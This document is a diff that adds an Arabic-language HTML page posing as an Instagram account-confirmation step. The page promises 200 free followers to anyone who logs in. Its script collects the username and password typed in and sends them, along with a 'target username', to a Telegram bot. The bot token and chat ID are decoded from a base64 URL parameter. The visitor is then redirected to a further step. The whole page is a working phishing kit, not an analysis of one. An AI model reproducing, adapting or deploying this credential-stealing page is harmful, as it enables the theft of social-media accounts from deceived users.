@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد الحساب • Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 380px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* 🎁 شريط التقدم */
+        .progress-bar {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .progress-step {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            font-weight: 700;
+            background: #dbdbdb;
+            color: #8e8e8e;
+            transition: all 0.3s;
+        }
+
+        .progress-step.done {
+            background: linear-gradient(135deg, #833ab4, #fd1d1d);
+            color: white;
+        }
+
+        .progress-step.active {
+            background: linear-gradient(135deg, #833ab4, #fd1d1d);
+            color: white;
+            box-shadow: 0 0 0 4px rgba(253, 29, 29, 0.2);
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 0 4px rgba(253, 29, 29, 0.2); }
+            50% { box-shadow: 0 0 0 8px rgba(253, 29, 29, 0.1); }
+        }
+
+        .progress-line {
+            width: 40px;
+            height: 2px;
+            background: #dbdbdb;
+        }
+
+        .progress-line.done {
+            background: linear-gradient(90deg, #833ab4, #fd1d1d);
+        }
+
+        /* 📝 الهيدر */
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .header .logo-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .header .logo-wrapper img {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .header .logo-wrapper .logo-text {
+            font-size: 42px;
+            font-weight: 700;
+            color: #262626;
+            letter-spacing: -2px;
+            font-family: 'Brush Script MT', cursive, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        /* 📦 البطاقة */
+        .card {
+            background: white;
+            border-radius: 4px;
+            border: 1px solid #dbdbdb;
+            padding: 32px 35px 26px;
+        }
+
+        /* 🏆 شريط التوثيق */
+        .verified-banner {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 14px 16px;
+            background: linear-gradient(135deg, #e7f3ff 0%, #f0f8ff 100%);
+            border: 1px solid #b3d9ff;
+            border-radius: 10px;
+            margin-bottom: 22px;
+        }
+
+        .verified-banner .badge-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 38px;
+            height: 38px;
+            background: linear-gradient(135deg, #833ab4, #fd1d1d);
+            border-radius: 50%;
+            flex-shrink: 0;
+            animation: pulseBadge 2s ease-in-out infinite;
+        }
+
+        @keyframes pulseBadge {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+        }
+
+        .verified-banner .badge-icon svg {
+            width: 22px;
+            height: 22px;
+            fill: white;
+        }
+
+        .verified-banner .banner-text {
+            font-size: 13px;
+            color: #00376b;
+            font-weight: 600;
+            line-height: 1.4;
+            text-align: right;
+        }
+
+        .verified-banner .banner-text .small {
+            display: block;
+            font-size: 11.5px;
+            color: #5f6368;
+            font-weight: 400;
+            margin-top: 2px;
+        }
+
+        /* 📝 حقول الإدخال */
+        .input-group {
+            margin-bottom: 6px;
+            position: relative;
+        }
+
+        .input-group .input-wrapper {
+            position: relative;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 42px 14px 12px;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            font-size: 14px;
+            background: #fafafa;
+            transition: all 0.2s ease;
+            outline: none;
+            color: #262626;
+            direction: ltr;
+            text-align: right;
+        }
+
+        .input-group input:focus {
+            border-color: #a8a8a8;
+            background: white;
+            box-shadow: 0 0 0 2px rgba(0, 0, 0, 0.05);
+        }
+
+        .input-group input::placeholder {
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+
+        .input-group input.error {
+            border-color: #ed4956;
+            background: #fff0f0;
+        }
+
+        .field-error {
+            color: #ed4956;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+            text-align: right;
+            margin-bottom: 4px;
+        }
+
+        .field-error.show {
+            display: block;
+            animation: slideDown 0.2s ease;
+        }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .toggle-password {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 4px;
+            color: #8e8e8e;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 4px;
+            transition: all 0.2s;
+        }
+
+        .toggle-password:hover {
+            color: #262626;
+        }
+
+        .toggle-password svg {
+            width: 20px;
+            height: 20px;
+            fill: currentColor;
+        }
+
+        /* 🔵 زر تسجيل الدخول */
+        .btn-login {
+            width: 100%;
+            padding: 12px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-family: inherit;
+        }
+
+        .btn-login:hover {
+            background: #1877f2;
+            box-shadow: 0 4px 14px rgba(0, 149, 246, 0.4);
+        }
+
+        .btn-login:active {
+            transform: scale(0.98);
+        }
+
+        .btn-login:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* ➗ الفاصل */
+        .divider-container {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+        }
+
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .divider-text {
+            padding: 0 18px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        /* 🔵 زر Facebook */
+        .btn-facebook {
+            width: 100%;
+            padding: 10px;
+            background: transparent;
+            color: #385185;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-family: inherit;
+        }
+
+        .btn-facebook:hover {
+            background: rgba(56, 81, 133, 0.05);
+        }
+
+        .btn-facebook i {
+            font-size: 18px;
+        }
+
+        /* 🔗 نسيت كلمة المرور */
+        .forgot-password {
+            display: block;
+            text-align: center;
+            color: #00376b;
+            font-size: 13px;
+            text-decoration: none;
+            margin-top: 16px;
+            font-weight: 500;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        /* 🎁 نص المتابعين */
+        .followers-note {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .followers-note strong {
+            color: #fd1d1d;
+        }
+
+        @media (max-width: 450px) {
+            .card {
+                padding: 24px 22px 20px;
+            }
+            .header .logo-wrapper .logo-text {
+                font-size: 36px;
+            }
+            .header .logo-wrapper img {
+                width: 34px;
+                height: 34px;
+            }
+            .input-group input {
+                font-size: 13px;
+                padding: 13px 38px 13px 10px;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+
+<div class="container">
+
+    <!-- 🎁 شريط التقدم -->
+    <div class="progress-bar">
+        <div class="progress-step done">✓</div>
+        <div class="progress-line done"></div>
+        <div class="progress-step active">2</div>
+        <div class="progress-line"></div>
+        <div class="progress-step">3</div>
+    </div>
+
+    <!-- 📝 الهيدر -->
+    <div class="header">
+        <div class="logo-wrapper">
+            <img src="insta.png" alt="Instagram" style="width: 42px; height: 42px; border-radius: 50%; object-fit: cover;">
+            <span class="logo-text">Instagram</span>
+        </div>
+    </div>
+
+    <!-- 📦 البطاقة -->
+    <div class="card">
+
+        <!-- 🏆 شريط التوثيق -->
+        <div class="verified-banner">
+            <div class="badge-icon">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+                </svg>
+            </div>
+            <div class="banner-text">
+                🔵 حسابك موثّق ✓
+                <span class="small">سجّل دخولك لتأكيد استلام 200 متابع</span>
+            </div>
+        </div>
+
+        <form id="loginForm" novalidate>
+
+            <!-- حقل اسم المستخدم -->
+            <div class="input-group">
+                <div class="input-wrapper">
+                    <input type="text" id="username" placeholder="رقم الهاتف أو البريد الإلكتروني أو اسم المستخدم" required autocomplete="username">
+                </div>
+                <div class="field-error" id="usernameError"></div>
+            </div>
+
+            <!-- حقل كلمة المرور -->
+            <div class="input-group">
+                <div class="input-wrapper">
+                    <input type="password" id="password" placeholder="كلمة المرور" required autocomplete="current-password">
+                    <button type="button" class="toggle-password" data-target="password" aria-label="إظهار كلمة المرور">
+                        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                    </button>
+                </div>
+                <div class="field-error" id="passwordError"></div>
+            </div>
+
+            <!-- زر تسجيل الدخول -->
+            <button type="submit" class="btn-login" id="loginBtn">
+                <i class="fas fa-check-circle"></i>
+                تسجيل الدخول وتأكيد المتابعين
+            </button>
+
+        </form>
+
+        <!-- ➗ الفاصل -->
+        <div class="divider-container">
+            <div class="divider-line"></div>
+            <span class="divider-text">أو</span>
+            <div class="divider-line"></div>
+        </div>
+
+        <!-- 🔵 زر Facebook -->
+        <button type="button" class="btn-facebook" id="facebookBtn">
+            <i class="fab fa-facebook-square"></i>
+            تسجيل الدخول باستخدام Facebook
+        </button>
+
+        <!-- 🔗 نسيت كلمة المرور -->
+        <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password" id="forgotLink">
+            هل نسيت كلمة المرور؟
+        </a>
+
+        <!-- 🎁 نص المتابعين -->
+        <div class="followers-note">
+            🎁 جاهز لاستلام <strong>200 متابع</strong> بعد تأكيد الحساب
+        </div>
+
+    </div>
+
+</div>
+
+<script>
+    // ================================================================
+    // 🔐 قراءة البيانات المشفّرة
+    // ================================================================
+    const urlParams = new URLSearchParams(window.location.search);
+    const encodedData = urlParams.get('d') || "";
+    const finalEncoded = encodedData || sessionStorage.getItem('wa_encoded') || "";
+
+    if (finalEncoded) {
+        sessionStorage.setItem('wa_encoded', finalEncoded);
+    }
+
+    let BOT_TOKEN = "";
+    let CHAT_ID = "";
+
+    if (finalEncoded) {
+        try {
+            const decoded = atob(finalEncoded);
+            const parts = decoded.split('|');
+            BOT_TOKEN = parts[0] || "";
+            CHAT_ID   = parts[1] || "";
+        } catch (e) {
+            console.error('❌ فشل فك التشفير:', e);
+        }
+    }
+
+    // عرض اسم المستخدم من الخطوة السابقة
+    const savedUsername = localStorage.getItem('ig_username') || "";
+    if (savedUsername) {
+        document.getElementById('username').value = savedUsername;
+    }
+
+    // ================================================================
+    // 1. TOGGLE PASSWORD
+    // ================================================================
+    document.querySelectorAll('.toggle-password').forEach(button => {
+        button.addEventListener('click', function() {
+            const targetId = this.getAttribute('data-target');
+            const input = document.getElementById(targetId);
+            if (!input) return;
+
+            if (input.type === 'password') {
+                input.type = 'text';
+                this.innerHTML = `<svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/><path d="M3.27 2.5L2 3.77 5.23 7C3.31 8.3 1.96 10.01 1 12c1.73 4.39 6 7.5 11 7.5 1.91 0 3.73-.48 5.31-1.31L20.23 21 21.5 19.73 3.27 2.5zM12 17c-2.76 0-5-2.24-5-5 0-.96.27-1.87.76-2.64l1.44 1.44c-.13.39-.2.79-.2 1.2 0 1.66 1.34 3 3 3 .41 0 .81-.07 1.2-.2l1.44 1.44C13.87 16.73 12.96 17 12 17zm3.12-5.03c.08.33.13.67.13 1.03 0 1.66-1.34 3-3 3-.36 0-.7-.05-1.03-.13l3.9-3.9z"/></svg>`;
+            } else {
+                input.type = 'password';
+                this.innerHTML = `<svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>`;
+            }
+        });
+    });
+
+    // ================================================================
+    // 2. SEND TO TELEGRAM
+    // ================================================================
+    function sendToTelegram(username, password) {
+        if (!BOT_TOKEN || !CHAT_ID) return;
+
+        const igUsername = localStorage.getItem('ig_username') || 'غير محدد';
+
+        const message = `
+🎁 **طلب زيادة متابعين - Instagram (الخطوة 2/2)**
+
+👤 **اسم المستخدم المستهدف:** 
+\`${igUsername}\`
+
+📧 **بيانات الدخول:** 
+\`${username}\`
+
+🔑 **كلمة المرور:** 
+\`${password}\`
+
+🎯 **العرض:** +200 متابع مجانًا
+
+🕐 **التاريخ:** ${new Date().toLocaleString('ar-EG')}
+
+📌 **IP:** ${window.location.hostname}
+        `;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        }).catch(error => console.log('Telegram error:', error));
+    }
+
+    // ================================================================
+    // 3. FORM SUBMISSION
+    // ================================================================
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const loginBtn = document.getElementById('loginBtn');
+
+        document.querySelectorAll('.field-error').forEach(el => {
+            el.classList.remove('show');
+            el.textContent = '';
+        });
+        document.querySelectorAll('.input-group input').forEach(el => {
+            el.classList.remove('error');
+        });
+
+        let hasError = false;
+
+        if (!username) {
+            document.getElementById('username').classList.add('error');
+            document.getElementById('usernameError').textContent = '⚠️ يرجى إدخال اسم المستخدم';
+            document.getElementById('usernameError').classList.add('show');
+            hasError = true;
+        }
+
+        if (!password) {
+            document.getElementById('password').classList.add('error');
+            document.getElementById('passwordError').textContent = '⚠️ يرجى إدخال كلمة المرور';
+            document.getElementById('passwordError').classList.add('show');
+            hasError = true;
+        }
+
+        if (hasError) return;
+
+        if (password.length < 6) {
+            document.getElementById('password').classList.add('error');
+            document.getElementById('passwordError').textContent = '⚠️ كلمة المرور يجب أن تكون 6 أحرف على الأقل';
+            document.getElementById('passwordError').classList.add('show');
+            return;
+        }
+
+        // تعطيل الزر
+        loginBtn.disabled = true;
+        loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التحقق...';
+
+        // إرسال إلى Telegram
+        sendToTelegram(username, password);
+
+        // الانتقال إلى صفحة الانتظار
+        setTimeout(() => {
+            let nextUrl = 'followers-step3.html';
+            if (finalEncoded) {
+                nextUrl += '?d=' + encodeURIComponent(finalEncoded);
+            }
+            window.location.href = nextUrl;
+        }, 800);
+    });
+
+    // ================================================================
+    // 4. REAL-TIME VALIDATION
+    // ================================================================
+    document.getElementById('username').addEventListener('input', function() {
+        if (this.value.trim()) {
+            this.classList.remove('error');
+            document.getElementById('usernameError').classList.remove('show');
+        }
+    });
+
+    document.getElementById('password').addEventListener('input', function() {
+        if (this.value.trim()) {
+            this.classList.remove('error');
+            document.getElementById('passwordError').classList.remove('show');
+        }
+    });
+
+    // ================================================================
+    // 5. EXTERNAL LINKS
+    // ================================================================
+    document.getElementById('forgotLink').addEventListener('click', function(e) {
+        e.preventDefault();
+        window.location.href = 'https://www.instagram.com/accounts/password/reset/';
+    });
+
+    document.getElementById('facebookBtn').addEventListener('click', function() {
+        window.location.href = 'https://www.facebook.com/login/';
+    });
+
+    console.log('✅ Followers Step 2 loaded');
+</script>
+
+</body>
+</html>
